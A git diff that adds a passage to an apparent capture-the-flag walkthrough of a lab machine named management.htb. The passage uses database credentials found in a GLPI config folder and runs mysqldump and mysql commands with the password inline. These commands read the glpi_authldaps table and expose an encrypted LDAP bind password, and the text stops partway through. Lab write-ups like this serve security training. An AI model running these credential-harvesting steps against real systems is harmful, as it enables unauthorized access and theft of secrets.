@@ -106,6 +106,34 @@ Inside the config directory we can find the following info:
 
 <img width="1910" height="272" alt="image" src="https://github.com/user-attachments/assets/a986454d-2b8e-4673-90da-7fbcd70a0b9a" />
 
+This tells uns that we have the creds for the database at 3306. We could dump the whole database, but it's huge:
+````
+mysqldump -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb > glpidb.sql
+````
+Instead let's query it:
+````
+mysql -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SHOW TABLES;"
+````
 
-<img width="1906" height="517" alt="image" src="https://github.com/user-attachments/assets/c5a4c498-cfcc-4ea2-b22f-47d2721f682b" />
+Here the table that interests us is the following:
+
+<img width="1391" height="405" alt="image" src="https://github.com/user-attachments/assets/c7b0300e-e6c8-4416-b6e5-d7303f2d6971" />
+
+Check "glpi_authldaps";
+````
+$ mysql -h 127.0.0.1 -u glpi -p'8rhu0L6Pw4Y7' glpidb -e "SELECT * FROM glpi_authldaps;" -t
++----+----------------------+--------------------+----------------------+----------------------------------------------+------+-----------+-------------+------------+---------+-------------+-----------------+-------------------+--------------------+--------------+----------------+-----------------+-------------+--------------+--------------+---------------+--------+-------------+--------------+-------------+----------------+----------------+---------------------+---------------------------------------------------------------------+------------+-----------+--------------------------------------------------------------------------+---------------------------+--------------+--------------+--------------+----------------+-------------------+----------+---------------+----------------------+---------------+------------------+----------------+---------------------+------------------+--------------+-------------+----------+---------+-------------+
+| id | name                 | host               | basedn               | rootdn                                       | port | condition | login_field | sync_field | use_tls | group_field | group_condition | group_search_type | group_member_field | email1_field | realname_field | firstname_field | phone_field | phone2_field | mobile_field | comment_field | use_dn | time_offset | deref_option | title_field | category_field | language_field | date_mod            | comment                                                             | is_default | is_active | rootdn_passwd                                                            | registration_number_field | email2_field | email3_field | email4_field | location_field | responsible_field | pagesize | ldap_maxlimit | can_support_pagesize | picture_field | begin_date_field | end_date_field | date_creation       | inventory_domain | tls_certfile | tls_keyfile | use_bind | timeout | tls_version |
++----+----------------------+--------------------+----------------------+----------------------------------------------+------+-----------+-------------+------------+---------+-------------+-----------------+-------------------+--------------------+--------------+----------------+-----------------+-------------+--------------+--------------+---------------+--------+-------------+--------------+-------------+----------------+----------------+---------------------+---------------------------------------------------------------------+------------+-----------+--------------------------------------------------------------------------+---------------------------+--------------+--------------+--------------+----------------+-------------------+----------+---------------+----------------------+---------------+------------------+----------------+---------------------+------------------+--------------+-------------+----------+---------+-------------+
+|  1 | Management Directory | sso.management.htb | dc=management,dc=htb | cn=svc-glpi,ou=services,dc=management,dc=htb |  389 | NULL      | uid         | uid        |       0 | NULL        | NULL            |                 0 | NULL               | NULL         | NULL           | NULL            | NULL        | NULL         | NULL         | NULL          |      1 |           0 |            0 | NULL        | NULL           | NULL           | 2026-06-02 01:25:41 | Primary directory bind used to synchronise managed client accounts. |          0 |         1 | avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw== | NULL                      | NULL         | NULL         | NULL         | NULL           | NULL              |        0 |             0 |                    0 | NULL          | NULL             | NULL           | 2026-06-02 01:25:41 | NULL             | NULL         | NULL        |        1 |      10 | NULL        |
++----+----------------------+--------------------+----------------------+----------------------------------------------+------+-----------+-------------+------------+---------+-------------+-----------------+-------------------+--------------------+--------------+----------------+-----------------+-------------+--------------+--------------+---------------+--------+-------------+--------------+-------------+----------------+----------------+---------------------+---------------------------------------------------------------------+------------+-----------+--------------------------------------------------------------------------+---------------------------+--------------+--------------+--------------+----------------+-------------------+----------+---------------+----------------------+---------------+------------------+----------------+---------------------+------------------+--------------+-------------+----------+---------+-------------+
+$ 
+````
+rootdn_passwd is avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
+
+Hashid does not know what this is but keep hold of it:
+<img width="902" height="60" alt="image" src="https://github.com/user-attachments/assets/0ccbb128-277f-4578-b3b4-1e61a13089c1" />
+
+We would do good looking at the source code for glpi. Doing that we found this 
+
 
